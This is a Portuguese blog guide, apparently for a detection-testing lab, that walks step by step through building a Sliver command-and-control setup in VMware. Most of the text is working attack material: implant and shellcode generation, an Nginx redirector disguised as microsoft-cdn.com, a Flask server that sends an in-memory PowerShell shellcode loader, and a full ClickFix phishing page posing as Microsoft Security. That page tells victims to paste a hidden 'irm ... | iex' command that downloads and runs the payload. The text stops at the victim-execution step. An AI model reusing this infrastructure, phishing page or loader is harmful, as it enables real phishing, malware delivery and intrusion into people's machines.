---
title: "Infraestrutura Completa de C2 Moderno: Guia Prático"
url: "/blog/infraestrutura-completa-de-c2-moderno-guia-pratico"
date: 2026-01-14T16:07:00-03:00
draft: false
description: "Guia prático sobre infraestrutura moderna de C2, abordando arquitetura, evasão, comunicação segura, uso de nuvem, redirecionadores e boas práticas para operações ofensivas e defensivas."
noindex: false
featured: false
pinned: false
comments: false
series:
 - 
categories:
 - Windows
 - Segurança e Defesa
 - Ataques e Exploração
 - Resposta a Incidentes
 - Threat Detection
 - Threat Hunting
tags:
 - Resposta a Incidentes
 - Análise de Logs
 - Registros
 - Threat Hunting
 - Detecção de Ameaças
 - Exploração
 - Logs do Windows
 - Scripts
 - PowerShell
 - CyberSecurity
 - Threat Detection
 - C2Detection
 - SIEM
 - SOAR
authors:
 - sandson
#images:
---
# Laboratório Completo de C2 - Infraestrutura VMware para Testes de Detecção

## 📋 Visão Geral da Infraestrutura

### Topologia de Rede

```
[VLAN 10 - Internet Simulada]
    ├── pfSense/Firewall (Gateway)
    │
[VLAN 20 - DMZ - Redirectors]
    ├── Ubuntu Redirector 1 (Nginx)
    ├── Ubuntu Redirector 2 (Backup)
    │
[VLAN 30 - C2 Network (Isolada)]
    ├── Ubuntu C2 Server (Sliver)
    ├── Ubuntu Logging Server
    │
[VLAN 40 - Rede Corporativa Vítima]
    ├── Windows 10/11 Workstation (Vítima Inicial)
    ├── Windows Server 2019/2022 (AD DC)
    ├── Windows 10 Workstation 2 (Lateral Movement)
    ├── Ubuntu SIEM (Wazuh/ELK/Splunk)
```

## 🖥️ Máquinas Virtuais Necessárias

### Lista de VMs (Total: 8 VMs)

1. **pfSense Firewall** - 1 CPU, 1GB RAM, 20GB HD
2. **Ubuntu Redirector 1** - 1 CPU, 2GB RAM, 20GB HD
3. **Ubuntu Redirector 2** - 1 CPU, 2GB RAM, 20GB HD
4. **Ubuntu C2 Server** - 2 CPU, 4GB RAM, 40GB HD
5. **Ubuntu Logging Server** - 2 CPU, 2GB RAM, 30GB HD
6. **Windows Server 2022 (DC)** - 2 CPU, 4GB RAM, 60GB HD
7. **Windows 10 Client 1** - 2 CPU, 4GB RAM, 60GB HD
8. **Windows 10 Client 2** - 2 CPU, 4GB RAM, 60GB HD
9. **Ubuntu SIEM** - 4 CPU, 8GB RAM, 100GB HD

### Configuração de Redes VMware

**VMnet Configuration:**

- **VMnet2 (VLAN 10)** - Internet Simulada: `192.168.10.0/24`
- **VMnet3 (VLAN 20)** - DMZ: `192.168.20.0/24`
- **VMnet4 (VLAN 30)** - C2 Network: `10.99.99.0/24`
- **VMnet5 (VLAN 40)** - Corp Network: `192.168.100.0/24`

## 📝 Passo a Passo Detalhado

---

## FASE 1: Configuração das Redes no VMware

### 1.1 Criar VMnets Customizadas

1. Abra **VMware Workstation**
2. Vá em **Edit → Virtual Network Editor**
3. Clique em **Change Settings** (executar como admin)
4. Adicione as redes:

**VMnet2:**
- Tipo: Host-only
- Subnet: 192.168.10.0
- Mask: 255.255.255.0
- DHCP: Desabilitado

**VMnet3:**
- Tipo: Host-only
- Subnet: 192.168.20.0
- Mask: 255.255.255.0
- DHCP: Desabilitado

**VMnet4:**
- Tipo: Host-only
- Subnet: 10.99.99.0
- Mask: 255.255.255.0
- DHCP: Desabilitado

**VMnet5:**
- Tipo: Host-only
- Subnet: 192.168.100.0
- Mask: 255.255.255.0
- DHCP: Desabilitado

---

## FASE 2: Configuração do pfSense (Firewall/Router)

### 2.1 Instalação do pfSense

1. Baixe pfSense CE ISO
2. Crie VM com 4 interfaces de rede:
   - Adapter 1: NAT (WAN simulada)
   - Adapter 2: VMnet2 (Internet Simulada)
   - Adapter 3: VMnet3 (DMZ)
   - Adapter 4: VMnet5 (Corp Network)

3. Instale pfSense (padrão, sem modificações)

### 2.2 Configuração Inicial pfSense

**Console do pfSense:**

```
Atribuir interfaces:
WAN: em0 (NAT)
LAN: em1 (VMnet2 - 192.168.10.1/24)
OPT1: em2 (VMnet3 - 192.168.20.1/24) - DMZ
OPT2: em3 (VMnet5 - 192.168.100.1/24) - CORP
```

**Acessar WebGUI:**
- De uma VM temporária em VMnet2, acesse: `http://192.168.10.1`
- User: `admin` / Pass: `pfsense`

### 2.3 Regras de Firewall pfSense

**⚠️ IMPORTANTE: Configure DNS no pfSense**

- **System → General Setup**
  - DNS Servers: 8.8.8.8, 1.1.1.1
  - Habilitar DNS Forwarder

- **Services → DNS Resolver**
  - Habilitar
  - Adicionar Host Override:
    - Host: `updates`
    - Domain: `microsoft-cdn.com`
    - IP: `192.168.20.10` (Redirector 1)

**Regras de Firewall:**

**DMZ (OPT1) Rules:**
```
Allow: DMZ → 10.99.99.0/24 (C2 Network) port 51820 (WireGuard)
Allow: DMZ → Any port 80,443 (Saída HTTP/HTTPS)
Block: DMZ → CORP Network (192.168.100.0/24)
```

**CORP Network (OPT2) Rules:**
```
Allow: CORP → DMZ port 443 (HTTPS para redirector)
Allow: CORP → WAN port 80,443 (Internet)
Block: CORP → C2 Network (10.99.99.0/24)
Log: All traffic
```

---

## FASE 3: Servidor C2 (Ubuntu + Sliver)

### 3.1 Criar VM Ubuntu Server C2

**Configurações VM:**
- OS: Ubuntu Server 22.04 LTS
- RAM: 4GB
- HD: 40GB
- Network: VMnet4 (Custom - 10.99.99.0/24)
- IP Estático: `10.99.99.10`

### 3.2 Instalação e Configuração Base

```bash
# Após instalar Ubuntu Server
sudo apt update && sudo apt upgrade -y

# Configurar IP estático
sudo nano /etc/netplan/00-installer-config.yaml
```

**Conteúdo do netplan:**
```yaml
network:
  version: 2
  ethernets:
    ens33:
      addresses:
        - 10.99.99.10/24
      routes:
        - to: 192.168.20.0/24
          via: 10.99.99.1
      nameservers:
        addresses: [8.8.8.8, 1.1.1.1]
```

```bash
sudo netplan apply

# Instalar dependências
sudo apt install -y git build-essential curl wget net-tools vim tmux wireguard
```

### 3.3 Instalar Sliver C2

```bash
# Baixar e instalar Sliver
curl https://sliver.sh/install | sudo bash

# Criar diretório de trabalho
mkdir -p ~/sliver-c2
cd ~/sliver-c2

# Iniciar Sliver pela primeira vez (vai criar configs)
sudo sliver-server

# Sair com Ctrl+C após inicializar
```

### 3.4 Configurar WireGuard no C2 Server

```bash
# Gerar chaves WireGuard
wg genkey | sudo tee /etc/wireguard/c2-private.key
sudo cat /etc/wireguard/c2-private.key | wg pubkey | sudo tee /etc/wireguard/c2-public.key

# Permissões
sudo chmod 600 /etc/wireguard/c2-private.key

# Criar configuração WireGuard
sudo nano /etc/wireguard/wg0.conf
```

**Conteúdo wg0.conf:**
```ini
[Interface]
Address = 10.88.88.1/24
PrivateKey = <CONTEÚDO_DO_ARQUIVO_c2-private.key>
ListenPort = 51820

# Peer: Redirector 1
[Peer]
PublicKey = <SERÁ_GERADA_NO_REDIRECTOR_1>
AllowedIPs = 10.88.88.2/32
PersistentKeepalive = 25

# Peer: Redirector 2 (Backup)
[Peer]
PublicKey = <SERÁ_GERADA_NO_REDIRECTOR_2>
AllowedIPs = 10.88.88.3/32
PersistentKeepalive = 25
```

```bash
# Habilitar IP forwarding
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# Iniciar WireGuard
sudo systemctl enable wg-quick@wg0
sudo systemctl start wg-quick@wg0

# Verificar
sudo wg show
```

### 3.5 Configurar Sliver C2

```bash
# Iniciar Sliver em modo daemon
sudo sliver-server daemon &

# Conectar ao daemon
sudo sliver-client

# Dentro do Sliver client
```

**Comandos Sliver:**
```
# Criar listener MTLS (via VPN)
sliver > mtls --lhost 10.88.88.1 --lport 8443

# Criar listener HTTP/HTTPS (via redirector)
sliver > https --lhost 10.88.88.1 --lport 443 --domain microsoft-cdn.com

# Criar perfil de implante
sliver > profiles new --mtls 10.88.88.1:8443 \
    --skip-symbols \
    --format exe \
    --http microsoft-cdn.com:443 \
    --arch amd64 \
    --os windows \
    win-implant

# Gerar implante
sliver > generate --profile win-implant --save /tmp/implant.exe

# Gerar shellcode para PowerShell
sliver > generate --profile win-implant --format shellcode --save /tmp/implant.bin
```

**Criar payload PowerShell:**
```bash
# Converter shellcode para base64
base64 -w 0 /tmp/implant.bin > /tmp/implant_b64.txt

# Salvar para usar no script de delivery
cat /tmp/implant_b64.txt
```

---

## FASE 4: Servidor Redirector (Ubuntu + Nginx)

### 4.1 Criar VM Ubuntu Redirector 1

**Configurações VM:**
- OS: Ubuntu Server 22.04 LTS
- RAM: 2GB
- HD: 20GB
- Network Adapter 1: VMnet3 (DMZ - 192.168.20.0/24)
- Network Adapter 2: VMnet4 (C2 Network - 10.99.99.0/24)
- IP DMZ: `192.168.20.10`
- IP C2 Net: `10.99.99.20`

### 4.2 Configuração de Rede Redirector

```bash
sudo nano /etc/netplan/00-installer-config.yaml
```

**Conteúdo:**
```yaml
network:
  version: 2
  ethernets:
    ens33:  # Interface DMZ
      addresses:
        - 192.168.20.10/24
      routes:
        - to: default
          via: 192.168.20.1
      nameservers:
        addresses: [8.8.8.8, 1.1.1.1]
    ens34:  # Interface C2 Network
      addresses:
        - 10.99.99.20/24
```

```bash
sudo netplan apply

# Instalar pacotes
sudo apt update
sudo apt install -y nginx wireguard certbot python3-certbot-nginx curl
```

### 4.3 Configurar WireGuard no Redirector

```bash
# Gerar chaves
wg genkey | sudo tee /etc/wireguard/redirector1-private.key
sudo cat /etc/wireguard/redirector1-private.key | wg pubkey | sudo tee /etc/wireguard/redirector1-public.key

sudo chmod 600 /etc/wireguard/redirector1-private.key

# Configuração WireGuard
sudo nano /etc/wireguard/wg0.conf
```

**Conteúdo wg0.conf:**
```ini
[Interface]
Address = 10.88.88.2/24
PrivateKey = <CONTEÚDO_redirector1-private.key>

[Peer]
PublicKey = <PUBLIC_KEY_DO_C2_SERVER>
Endpoint = 10.99.99.10:51820
AllowedIPs = 10.88.88.1/32
PersistentKeepalive = 25
```

```bash
# Habilitar e iniciar
sudo systemctl enable wg-quick@wg0
sudo systemctl start wg-quick@wg0

# Verificar conectividade com C2
ping 10.88.88.1
```

**⚠️ COPIAR CHAVES PÚBLICAS:**
```bash
# No Redirector 1, copie a public key:
cat /etc/wireguard/redirector1-public.key

# Cole essa chave no C2 Server no arquivo wg0.conf na seção [Peer]
# Depois reinicie WireGuard no C2:
sudo systemctl restart wg-quick@wg0
```

### 4.4 Configurar Nginx como Proxy Reverso

```bash
# Remover configuração padrão
sudo rm /etc/nginx/sites-enabled/default

# Criar certificado SSL autoassinado (para laboratório)
sudo mkdir -p /etc/nginx/ssl
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/nginx/ssl/c2.key \
  -out /etc/nginx/ssl/c2.crt \
  -subj "/C=US/ST=State/L=City/O=Microsoft/CN=microsoft-cdn.com"

# Criar configuração do Nginx
sudo nano /etc/nginx/sites-available/c2-redirector
```

**Conteúdo c2-redirector:**
```nginx
# Mapeamento de User-Agents legítimos
map $http_user_agent $is_legitimate_agent {
    default 0;
    "~*Mozilla/5.0.*Windows NT 10.0.*Chrome" 1;
    "~*C2-Implant-UA/1.0" 1;
}

# Mapeamento de Custom Header
map $http_x_c2_auth $is_legitimate_header {
    default 0;
    "Bearer-C2-TOKEN-12345" 1;
}

# Log customizado
log_format c2_access '$remote_addr - $remote_user [$time_local] '
                     '"$request" $status $body_bytes_sent '
                     '"$http_user_agent" "$http_x_c2_auth" "$http_x_client_id"';

# Servidor HTTPS
server {
    listen 443 ssl http2;
    server_name microsoft-cdn.com updates.microsoft-cdn.com;

    ssl_certificate /etc/nginx/ssl/c2.crt;
    ssl_certificate_key /etc/nginx/ssl/c2.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    access_log /var/log/nginx/c2-access.log c2_access;
    error_log /var/log/nginx/c2-error.log;

    # Verificação de User-Agent
    if ($is_legitimate_agent = 0) {
        return 301 https://www.microsoft.com/en-us/security/business$request_uri;
    }

    # Verificação de Header customizado
    if ($is_legitimate_header = 0) {
        return 301 https://www.microsoft.com/en-us/security/business$request_uri;
    }

    # Proxy para C2 via WireGuard
    location / {
        proxy_pass https://10.88.88.1:443;
        proxy_ssl_verify off;
        
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        
        proxy_buffering off;
        proxy_request_buffering off;
    }

    # Endpoint de staging/delivery
    location /api/v1/updates {
        proxy_pass http://10.88.88.1:8080;
        
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # Headers obrigatórios
        if ($http_x_c2_auth != "Bearer-C2-TOKEN-12345") {
            return 404;
        }
    }
}

# Servidor HTTP (redirect para HTTPS)
server {
    listen 80;
    server_name microsoft-cdn.com updates.microsoft-cdn.com;
    return 301 https://$server_name$request_uri;
}

# Servidor de redirecionamento para tráfego não autorizado
server {
    listen 8080;
    server_name _;
    return 301 https://www.microsoft.com;
}
```

```bash
# Habilitar site
sudo ln -s /etc/nginx/sites-available/c2-redirector /etc/nginx/sites-enabled/

# Testar configuração
sudo nginx -t

# Iniciar Nginx
sudo systemctl enable nginx
sudo systemctl restart nginx

# Verificar status
sudo systemctl status nginx
```

### 4.5 Criar Servidor de Payload Delivery

```bash
# Criar diretório de payload
sudo mkdir -p /var/www/c2-payload
sudo nano /var/www/c2-payload/serve.py
```

**Conteúdo serve.py:**
```python
#!/usr/bin/env python3
from flask import Flask, request, Response, abort
import base64
import datetime
import os

app = Flask(__name__)

# PAYLOAD BASE64 - Cole aqui o conteúdo de /tmp/implant_b64.txt do C2 Server
PAYLOAD_B64 = """
COLE_AQUI_O_SHELLCODE_BASE64_GERADO_PELO_SLIVER
"""

# Token de autenticação
AUTH_TOKEN = "Bearer-C2-TOKEN-12345"

# Log de acessos
LOG_FILE = "/var/log/c2-payload-access.log"

def log_access(client_id, ip, user_agent, success):
    timestamp = datetime.datetime.now().isoformat()
    log_entry = f"{timestamp} | Client: {client_id} | IP: {ip} | UA: {user_agent} | Success: {success}\n"
    with open(LOG_FILE, 'a') as f:
        f.write(log_entry)

@app.route('/api/v1/updates', methods=['GET'])
def serve_payload():
    # Validar header de autenticação
    auth_header = request.headers.get('X-C2-Auth')
    if auth_header != AUTH_TOKEN:
        log_access("UNKNOWN", request.remote_addr, request.headers.get('User-Agent'), False)
        abort(404)
    
    # Validar User-Agent
    user_agent = request.headers.get('User-Agent', '')
    if 'Windows NT 10.0' not in user_agent and 'C2-Implant-UA' not in user_agent:
        log_access("INVALID_UA", request.remote_addr, user_agent, False)
        abort(404)
    
    # Obter Client ID
    client_id = request.headers.get('X-Client-ID', 'UNKNOWN')
    
    # Log de sucesso
    log_access(client_id, request.remote_addr, user_agent, True)
    
    # Payload PowerShell que executa shellcode
    payload_script = f"""
# Decodificar shellcode
$sc = [System.Convert]::FromBase64String("{PAYLOAD_B64.strip()}")

# Alocar memória executável
$size = $sc.Length
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $size)

# Criar thread para executar shellcode
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Func[IntPtr]])
$hThread.Invoke([IntPtr]::Zero)
"""
    
    return Response(payload_script, mimetype='text/plain')

@app.route('/health', methods=['GET'])
def health_check():
    return Response("OK", status=200)

if __name__ == '__main__':
    # Criar arquivo de log se não existir
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, 'a').close()
    
    # Rodar servidor
    app.run(host='10.88.88.1', port=8080, debug=False)
```

```bash
# Instalar Flask no C2 Server (não no redirector!)
# SSH para o C2 Server (10.99.99.10)
sudo apt install -y python3-pip
pip3 install flask

# Criar serviço systemd para payload server
sudo nano /etc/systemd/system/c2-payload.service
```

**Conteúdo c2-payload.service:**
```ini
[Unit]
Description=C2 Payload Delivery Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/var/www/c2-payload
ExecStart=/usr/bin/python3 /var/www/c2-payload/serve.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
# Copiar script para C2 Server
scp /var/www/c2-payload/serve.py user@10.99.99.10:/tmp/

# No C2 Server:
sudo mkdir -p /var/www/c2-payload
sudo mv /tmp/serve.py /var/www/c2-payload/
sudo chmod +x /var/www/c2-payload/serve.py

# Iniciar serviço
sudo systemctl daemon-reload
sudo systemctl enable c2-payload
sudo systemctl start c2-payload
sudo systemctl status c2-payload
```

---

## FASE 5: Rede Corporativa (Active Directory)

### 5.1 Windows Server 2022 - Domain Controller

**Configurações VM:**
- OS: Windows Server 2022
- RAM: 4GB
- HD: 60GB
- Network: VMnet5 (CORP - 192.168.100.0/24)
- IP: `192.168.100.10`
- Nome: `DC01`
- Domain: `corp.local`

**Configuração de Rede:**
```powershell
# PowerShell como Administrador
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.100.10 -PrefixLength 24 -DefaultGateway 192.168.100.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses ("127.0.0.1","8.8.8.8")

# Renomear computador
Rename-Computer -NewName "DC01" -Restart
```

**Instalar Active Directory:**
```powershell
# Após reiniciar
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promover a Domain Controller
Install-ADDSForest `
  -DomainName "corp.local" `
  -DomainNetbiosName "CORP" `
  -ForestMode "WinThreshold" `
  -DomainMode "WinThreshold" `
  -InstallDns `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
  -Force
```

**Criar Usuários e OUs:**
```powershell
# Após reiniciar como Domain Controller

# Criar OUs
New-ADOrganizationalUnit -Name "Departments" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "IT" -Path "OU=Departments,DC=corp,DC=local"
New-ADOrganizationalUnit -Name "Finance" -Path "OU=Departments,DC=corp,DC=local"
New-ADOrganizationalUnit -Name "Workstations" -Path "DC=corp,DC=local"

# Criar usuários
New-ADUser -Name "John Doe" -GivenName "John" -Surname "Doe" `
  -SamAccountName "jdoe" -UserPrincipalName "jdoe@corp.local" `
  -Path "OU=IT,OU=Departments,DC=corp,DC=local" `
  -AccountPassword (ConvertTo-SecureString "User@123" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true

New-ADUser -Name "Jane Smith" -GivenName "Jane" -Surname "Smith" `
  -SamAccountName "jsmith" -UserPrincipalName "jsmith@corp.local" `
  -Path "OU=Finance,OU=Departments,DC=corp,DC=local" `
  -AccountPassword (ConvertTo-SecureString "User@123" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true

# Criar Admin
New-ADUser -Name "IT Admin" -GivenName "IT" -Surname "Admin" `
  -SamAccountName "itadmin" -UserPrincipalName "itadmin@corp.local" `
  -Path "OU=IT,OU=Departments,DC=corp,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Admin@123" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true

# Adicionar ao Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "itadmin"

# Verificar usuários
Get-ADUser -Filter * | Select Name, SamAccountName
```

### 5.2 Windows 10 Client 1 (Vítima Inicial)

**Configurações VM:**
- OS: Windows 10/11 Pro
- RAM: 4GB
- HD: 60GB
- Network: VMnet5 (CORP)
- IP: `192.168.100.101`
- Nome: `CLIENT01`

**Configuração de Rede:**
```powershell
# PowerShell como Administrador
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.100.101 -PrefixLength 24 -DefaultGateway 192.168.100.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses ("192.168.100.10")

# Renomear
Rename-Computer -NewName "CLIENT01" -Restart
```

**Ingressar no Domínio:**
```powershell
# Adicionar ao domínio
Add-Computer -DomainName "corp.local" -Credential (Get-Credential) -Restart

# Usar credenciais: CORP\itadmin / Admin@123
```

**Após reiniciar, logar com usuário do domínio:**
- User: `CORP\jdoe`
- Pass: `User@123`

### 5.3 Windows 10 Client 2 (Lateral Movement Target)

**Mesmas configurações do Client 1, mas:**
- Nome: `CLIENT02`
- IP: `192.168.100.102`

```powershell
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.100.102 -PrefixLength 24 -DefaultGateway 192.168.100.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses ("192.168.100.10")
Rename-Computer -NewName "CLIENT02" -Restart

# Ingressar no domínio
Add-Computer -DomainName "corp.local" -Credential (Get-Credential) -Restart
```

---

## FASE 6: Payload ClickFix e Execução

### 6.1 Criar Página ClickFix

**No Redirector ou em um servidor web separado, crie:**

```bash
sudo mkdir -p /var/www/html/clickfix
sudo nano /var/www/html/clickfix/index.html
```

**Conteúdo index.html:**
```html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança Microsoft</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 700px;
            width: 100%;
            padding: 40px;
            animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
```html
            }
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .icon {
            font-size: 64px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        h1 {
            color: #2c3e50;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #7f8c8d;
            font-size: 16px;
        }
        
        .alert-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 25px 0;
            border-radius: 4px;
        }
        
        .alert-box p {
            color: #856404;
            line-height: 1.6;
        }
        
        .steps {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        
        .steps h3 {
            color: #495057;
            margin-bottom: 15px;
            font-size: 18px;
        }
        
        .step {
            display: flex;
            align-items: center;
            margin: 12px 0;
            padding: 10px;
            background: white;
            border-radius: 6px;
            transition: all 0.3s;
        }
        
        .step:hover {
            transform: translateX(5px);
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        .step-number {
            background: #667eea;
            color: white;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
            flex-shrink: 0;
        }
        
        .step-text {
            color: #495057;
            flex-grow: 1;
        }
        
        .command-box {
            background: #1e1e1e;
            color: #4ec9b0;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            margin: 20px 0;
            position: relative;
            overflow-x: auto;
            line-height: 1.5;
            word-wrap: break-word;
            white-space: pre-wrap;
        }
        
        .command-box::before {
            content: 'PowerShell';
            position: absolute;
            top: -10px;
            left: 15px;
            background: #007acc;
            color: white;
            padding: 2px 10px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 25px;
        }
        
        .btn {
            flex: 1;
            padding: 15px 25px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: #667eea;
            color: white;
        }
        
        .btn-primary:hover {
            background: #5568d3;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        .btn-secondary {
            background: #e9ecef;
            color: #495057;
        }
        
        .btn-secondary:hover {
            background: #dee2e6;
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .info-box {
            background: #e7f3ff;
            border-left: 4px solid #2196F3;
            padding: 15px;
            margin-top: 20px;
            border-radius: 4px;
        }
        
        .info-box p {
            color: #0c5460;
            font-size: 14px;
            margin: 5px 0;
        }
        
        .session-id {
            font-family: 'Courier New', monospace;
            font-weight: bold;
            color: #2196F3;
        }
        
        .success-message {
            display: none;
            background: #d4edda;
            border-left: 4px solid #28a745;
            padding: 15px;
            margin-top: 20px;
            border-radius: 4px;
            animation: slideIn 0.3s ease-out;
        }
        
        .success-message.show {
            display: block;
        }
        
        .success-message p {
            color: #155724;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="icon">🔐</div>
            <h1>Verificação de Segurança Necessária</h1>
            <p class="subtitle">Microsoft Security Center</p>
        </div>

        <div class="alert-box">
            <p><strong>⚠️ Ação Necessária:</strong> Detectamos uma tentativa de acesso não autorizado à sua conta corporativa. Por medidas de segurança, é necessário executar uma verificação de integridade do sistema.</p>
        </div>

        <div class="steps">
            <h3>📋 Instruções de Verificação:</h3>
            <div class="step">
                <div class="step-number">1</div>
                <div class="step-text">Pressione <strong>Windows + R</strong> no seu teclado</div>
            </div>
            <div class="step">
                <div class="step-number">2</div>
                <div class="step-text">Clique no botão <strong>"Copiar Comando"</strong> abaixo</div>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <div class="step-text">Cole o comando na janela "Executar" e pressione <strong>Enter</strong></div>
            </div>
        </div>

        <div class="command-box" id="commandBox">powershell -NoP -W Hidden -Exec Bypass -C "irm https://microsoft-cdn.com/api/v1/updates|iex"</div>

        <div class="button-group">
            <button class="btn btn-primary" onclick="copyCommand()">
                📋 Copiar Comando
            </button>
            <button class="btn btn-secondary" onclick="showInstructions()">
                ❓ Ajuda
            </button>
        </div>

        <div class="success-message" id="successMessage">
            <p>✅ Comando copiado com sucesso! Agora pressione Windows + R e cole o comando.</p>
        </div>

        <div class="info-box">
            <p><strong>ID da Verificação:</strong> <span class="session-id" id="sessionId"></span></p>
            <p><strong>Timestamp:</strong> <span id="timestamp"></span></p>
            <p><strong>Computador:</strong> <span id="computerName"></span></p>
        </div>
    </div>

    <script>
        // Gerar ID de sessão único
        function generateSessionID() {
            const prefix = 'MSEC';
            const random = Math.random().toString(36).substring(2, 11).toUpperCase();
            const timestamp = Date.now().toString(36).toUpperCase();
            return `${prefix}-${timestamp}-${random}`;
        }

        // Gerar ID de cliente para rastreamento
        function generateClientID() {
            return 'CLI-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substring(2, 9).toUpperCase();
        }

        // Atualizar comando com ID único
        function updateCommand() {
            const clientID = generateClientID();
            const command = `powershell -NoP -W Hidden -Exec Bypass -C "$id='${clientID}';$h=@{'X-C2-Auth'='Bearer-C2-TOKEN-12345';'X-Client-ID'=$id;'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'};irm 'https://microsoft-cdn.com/api/v1/updates' -Headers $h|iex"`;
            document.getElementById('commandBox').textContent = command;
        }

        // Copiar comando para clipboard
        function copyCommand() {
            const commandText = document.getElementById('commandBox').textContent;
            
            navigator.clipboard.writeText(commandText).then(() => {
                const btn = document.querySelector('.btn-primary');
                const originalText = btn.innerHTML;
                btn.innerHTML = '✅ Copiado!';
                btn.style.background = '#28a745';
                
                document.getElementById('successMessage').classList.add('show');
                
                setTimeout(() => {
                    btn.innerHTML = originalText;
                    btn.style.background = '#667eea';
                }, 3000);
            }).catch(err => {
                alert('Erro ao copiar. Por favor, selecione e copie manualmente.');
            });
        }

        // Mostrar instruções detalhadas
        function showInstructions() {
            alert('INSTRUÇÕES DETALHADAS:\n\n' +
                  '1. Pressione as teclas Windows + R simultaneamente\n' +
                  '2. Uma janela "Executar" irá aparecer\n' +
                  '3. Clique no botão "Copiar Comando"\n' +
                  '4. Na janela "Executar", pressione Ctrl + V para colar\n' +
                  '5. Pressione Enter ou clique em OK\n' +
                  '6. Aguarde a verificação ser concluída\n\n' +
                  'Em caso de dúvidas, entre em contato com o suporte de TI.');
        }

        // Inicialização
        window.onload = function() {
            document.getElementById('sessionId').textContent = generateSessionID();
            document.getElementById('timestamp').textContent = new Date().toLocaleString('pt-BR');
            document.getElementById('computerName').textContent = 'CORP\\' + (navigator.platform || 'Unknown');
            updateCommand();
        };
    </script>
</body>
</html>
```

Salve o arquivo e configure o Nginx para servir:

```bash
# Adicionar virtual host no Redirector
sudo nano /etc/nginx/sites-available/clickfix
```

**Conteúdo clickfix:**
```nginx
server {
    listen 80;
    server_name phishing.microsoft-cdn.com;

    root /var/www/html/clickfix;
    index index.html;

    location / {
        try_files $uri $uri/ =404;
    }

    access_log /var/log/nginx/clickfix-access.log;
    error_log /var/log/nginx/clickfix-error.log;
}
```

```bash
sudo ln -s /etc/nginx/sites-available/clickfix /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

### 6.2 Executar no CLIENT01 (Vítima)

**No Windows 10 CLIENT01, logado como CORP\jdoe:**

